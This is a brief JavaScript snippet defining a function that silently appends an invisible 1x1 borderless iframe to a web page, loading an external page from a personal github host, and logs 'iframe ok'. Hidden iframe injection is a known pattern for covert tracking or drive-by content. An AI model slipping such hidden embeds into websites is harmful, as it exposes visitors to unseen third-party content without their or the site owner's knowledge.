(function(){

      var i = document.createElement('iframe');
      i.setAttribute('width', 1);
      i.setAttribute('height', 1);
      i.setAttribute('frameborder', 0);
      i.setAttribute('style', 'border:0px');
      i.setAttribute('src', '//peczenyj.github.com/external_all.html');
      try {
        document.body.appendChild(i);
      } catch (e) {}
      console.log('iframe ok');
})
